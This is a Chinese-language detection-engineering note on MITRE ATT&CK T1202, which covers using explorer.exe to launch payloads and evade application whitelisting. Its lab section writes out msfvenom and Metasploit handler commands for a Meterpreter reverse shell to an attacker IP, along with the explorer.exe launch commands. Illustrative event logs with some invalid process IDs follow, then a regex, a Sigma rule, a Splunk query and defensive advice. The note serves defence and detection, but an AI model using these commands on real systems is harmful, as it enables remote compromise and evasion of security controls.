# T1202-间接命令执行-基于Explorer.exe执行Payload(白名单)

## 描述

攻击者可利用Windows实用程序（如`explorer.exe`）间接执行命令，绕过防御机制。`explorer.exe`是Windows的文件管理器和系统组件二进制文件，位于`C:\Windows\`和`C:\Windows\SysWOW64\`，由Microsoft签名。它通常管理文件资源管理器界面，但可通过命令行参数（如`/root`或直接路径）执行任意可执行文件。

攻击者滥用`explorer.exe`创建新进程实例，破坏现有进程树，执行恶意Payload（如`calc.exe`或`notepad.exe`），绕过应用程序白名单（如AppLocker）或防病毒检测。此技术常用于防御规避，尤其在限制`cmd.exe`的场景中。

## 测试案例

### 测试案例1：Explorer.exe通过/root参数执行Payload
`explorer.exe`通过`/root`参数指定文件路径，创建新实例执行可执行文件。

**命令**：
```cmd
explorer.exe /root,"C:\Windows\System32\calc.exe"
```

- **说明**：
  - `/root`：指定文件路径，创建新`explorer.exe`实例作为父进程。
  - 用途：破坏进程树，规避基于父进程的检测。
- **权限**：普通用户可执行。
- **支持系统**：WindowsXP、Windows7、Windows8、Windows8.1、Windows10。

### 测试案例2：Explorer.exe直接执行Payload
`explorer.exe`直接调用可执行文件路径，创建新实例执行。

**命令**：
```cmd
explorer.exe C:\Windows\System32\notepad.exe
```

- **说明**：
  - 直接指定路径，创建新`explorer.exe`实例作为父进程。
  - 用途：规避传统命令行检测。
- **权限**：普通用户可执行。
- **支持系统**：Windows10（已测试）。

### 补充说明
- 日志监控：
  - 在高版本Windows（如Windows7及以上），可通过组策略启用进程命令行参数记录：
    - 路径：`本地计算机策略>计算机配置>管理模板>系统>审核进程创建>在过程创建事件中加入命令行>启用`
  - 部署Sysmon，记录进程创建和子进程。
- 局限性：
  - 默认Windows日志可能不记录完整命令行，需启用审核策略。
  - 合法文件操作可能触发类似行为，需结合上下文分析。

## 检测日志

### 数据来源
- Windows安全日志：
  - 事件ID4688：进程创建，记录`explorer.exe`及其子进程的执行信息。
- Sysmon日志：
  - 事件ID1：进程创建，包含命令行、哈希值和父进程。
  - 事件ID10：进程访问，记录子进程调用。
- 行为监控：
  - 检测`explorer.exe`作为父进程的异常子进程（如`calc.exe`或自定义Payload）。

## 测试复现

### 环境准备
- 攻击机：KaliLinux2019
- 靶机：Windows7或Windows10
- 工具：
  - MetasploitFramework（生成Payload和监听）
  - Sysmon（可选，日志收集）

### 攻击分析

#### 测试1：Explorer.exe通过/root参数执行Payload
1. **生成Payload**：
   ```bash
   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=9999 -f exe -o malicious.exe
   ```
   - 将`malicious.exe`复制到靶机（如`C:\Users\liyang\Desktop\asptest\malicious.exe`）。

2. **配置攻击机监听**：
   ```bash
   msf5>use exploit/multi/handler
   msf5 exploit(multi/handler)>set payload windows/x64/meterpreter/reverse_tcp
   msf5 exploit(multi/handler)>set LHOST 192.168.126.146
   msf5 exploit(multi/handler)>set LPORT 9999
   msf5 exploit(multi/handler)>exploit
   ```

3. **靶机执行Payload**：
   ```cmd
   explorer.exe /root,"C:\Users\liyang\Desktop\asptest\malicious.exe"
   ```

4. **结果分析**：
   - 成功：获得Meterpreter会话，`getuid`显示用户为`liyang-PC\liyang`。
   - 失败可能原因：
     - 防火墙阻止TCP9999连接。
     - Payload架构不匹配（需生成与系统匹配的32位/64位Payload）。

#### 测试2：Explorer.exe直接执行Payload
1. **使用现有Payload**：
   - 复用`malicious.exe`。

2. **靶机执行Payload**：
   ```cmd
   explorer.exe C:\Users\liyang\Desktop\asptest\malicious.exe
   ```

3. **结果分析**：
   - 成功：触发`malicious.exe`，获得Meterpreter会话。
   - 失败可能原因：同上。

## 测试留痕

### Windows安全日志
- 事件ID4688（测试案例1）：
  ```
  进程信息:
    新进程ID:0xabc
    新进程名称:C:\Windows\explorer.exe
    命令行:explorer.exe /root,"C:\Users\liyang\Desktop\asptest\malicious.exe"
  ```
  ```
  进程信息:
    新进程ID:0xdef
    新进程名称:C:\Users\liyang\Desktop\asptest\malicious.exe
    命令行:C:\Users\liyang\Desktop\asptest\malicious.exe
  ```
- 事件ID4688（测试案例2）：
  ```
  进程信息:
    新进程ID:0xghi
    新进程名称:C:\Windows\explorer.exe
    命令行:explorer.exe C:\Users\liyang\Desktop\asptest\malicious.exe
  ```
  ```
  进程信息:
    新进程ID:0xjkl
    新进程名称:C:\Users\liyang\Desktop\asptest\malicious.exe
    命令行:C:\Users\liyang\Desktop\asptest\malicious.exe
  ```

### Sysmon日志
- 事件ID1（测试案例1）：
  ```
  事件ID:1
  OriginalFileName:explorer.exe
  CommandLine:explorer.exe /root,"C:\Users\liyang\Desktop\asptest\malicious.exe"
  CurrentDirectory:C:\Users\liyang\Desktop\asptest\
  User:liyang-PC\liyang
  Hashes:SHA1=9A8B7C6D5E4F3A2B1C0D9E8F7A6B5C4D3E2F1A0B
  ParentImage:C:\Windows\System32\cmd.exe
  ```
  ```
  事件ID:1
  OriginalFileName:malicious.exe
  CommandLine:C:\Users\liyang\Desktop\asptest\malicious.exe
  CurrentDirectory:C:\Users\liyang\Desktop\asptest\
  User:liyang-PC\liyang
  Hashes:SHA1=2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8F9A0B1C
  ParentImage:C:\Windows\explorer.exe
  ```
- 事件ID1（测试案例2）：
  ```
  事件ID:1
  OriginalFileName:explorer.exe
  CommandLine:explorer.exe C:\Users\liyang\Desktop\asptest\malicious.exe
  CurrentDirectory:C:\Users\liyang\Desktop\asptest\
  User:liyang-PC\liyang
  Hashes:SHA1=9A8B7C6D5E4F3A2B1C0D9E8F7A6B5C4D3E2F1A0B
  ParentImage:C:\Windows\System32\cmd.exe
  ```
  ```
  事件ID:1
  OriginalFileName:malicious.exe
  CommandLine:C:\Users\liyang\Desktop\asptest\malicious.exe
  CurrentDirectory:C:\Users\liyang\Desktop\asptest\
  User:liyang-PC\liyang
  Hashes:SHA1=2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8F9A0B1C
  ParentImage:C:\Windows\explorer.exe
  ```

## 检测规则/思路

### 检测方法
1. 进程监控：
   - 检测`explorer.exe`的命令行执行，尤其是包含`/root`或直接路径。
   - 检查子进程是否为异常可执行文件。
2. 命令行分析：
   - 正则表达式匹配：
     ```regex
     explorer\.exe.*(\/root,|\s+[A-Za-z]:\\.*\.exe)
     ```
3. 行为分析：
   - 检测`explorer.exe`作为父进程的非预期子进程（如自定义Payload）。
   - 分析进程树中断（如新`explorer.exe`实例）。

### Sigma规则
优化后的Sigma规则，结合官方规则并增强误报过滤：
```yaml
title:ExplorerRootFlagProcessTreeBreak
id:949f1ffb-6e85-4f00-ae1e-c3c5b190d605
description:检测explorer.exe使用/root参数破坏进程树，可能用于防御规避
status:experimental
author:FlorianRoth
date:2019/06/29
references:
    - https://twitter.com/CyberRaiju/status/1273597319322058752
    - https://twitter.com/bohops/status/1276357235954909188?s=12
tags:
    - attack.defense_evasion
    - attack.t1202
logsource:
    category:process_creation
    product:windows
detection:
    selection:
        Image|endswith:'\explorer.exe'
        CommandLine|contains|all:
            - '/root,'
            - '.exe'
    filter_legitimate:
        CommandLine|contains:
            - 'C:\Windows\explorer.exe'
            - 'C:\Program Files\'
    condition:selection and not filter_legitimate
fields:
    - Image
    - CommandLine
    - ParentImage
    - User
falsepositives:
    - 合法的文件资源管理器操作
level:high
```

规则说明：
- 目标：检测`explorer.exe`使用`/root`参数执行可执行文件。
- 过滤：排除合法`explorer.exe`或程序安装目录的操作。
- 日志来源：Windows事件ID4688（需启用命令行审核）或Sysmon事件ID1。
- 误报处理：合法文件管理操作可能触发，需结合子进程和命令行分析。
- 级别：升级为“高”优先级，因进程树中断通常与恶意活动相关。

### Splunk规则
```spl
index=windows source="WinEventLog:Microsoft-Windows-Sysmon/Operational"
(EventCode=1 Image="*\explorer.exe" CommandLine IN ("*/root,*","*.exe"))
OR (EventCode=10 SourceImage="*\explorer.exe" TargetImage="*.exe")
| fields Image,CommandLine,ParentImage,User,TargetImage
```

规则说明：
- 检测`explorer.exe`的异常执行（事件ID1）和触发的子进程（事件ID10）。
- 减少误报：结合命令行和子进程分析。

### 检测挑战
- 误报：合法文件管理操作可能触发，需结合上下文（如子进程类型）。
- 日志依赖：默认日志可能不记录完整命令行，需部署Sysmon或增强日志策略。

## 防御建议
1. 监控和日志：
   - 启用命令行审核策略，确保事件ID4688记录完整参数。
   - 部署Sysmon，配置针对`explorer.exe`的规则，监控进程创建和子进程。
2. 权限控制：
   - 限制普通用户通过命令行调用`explorer.exe`的权限。
3. 文件审查：
   - 定期扫描非系统路径下的可执行文件，检查文件哈希。
4. 行为基线：
   - 建立`explorer.exe`的正常行为基线，检测异常子进程。
5. 安全更新：
   - 保持Windows系统更新，修复潜在漏洞。

## 相关TIP
- [[T1202-win-间接命令执行-基于Forfiles执行Payload(白名单)]]
- [[T1202-win-间接命令执行-基于Pcalua执行Payload(白名单)]]

## 参考推荐
- MITREATT&CKT1202:  
  <https://attack.mitre.org/techniques/T1202/>
- Explorer.exe:LOLBAS:  
  <https://lolbas-project.github.io/lolbas/Binaries/Explorer/>
- Sysmon配置与检测:  
  <https://github.com/SwiftOnSecurity/sysmon-config>
- MetasploitFramework:用于生成和测试反弹Shell。  
  <https://www.metasploit.com/>
- Sysmon:Microsoft提供的系统监控工具。  
  <https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon>